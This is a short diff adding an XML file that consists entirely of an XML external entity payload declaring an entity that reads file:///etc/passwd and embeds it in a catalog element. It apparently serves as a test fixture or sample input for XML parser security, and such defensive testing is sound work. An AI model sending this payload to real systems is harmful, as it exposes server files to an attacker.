@@ -1,0 +1,2 @@
+<!DOCTYPE catalog [<!ENTITY leaked SYSTEM "file:///etc/passwd">]>
+<catalog>&leaked;</catalog>
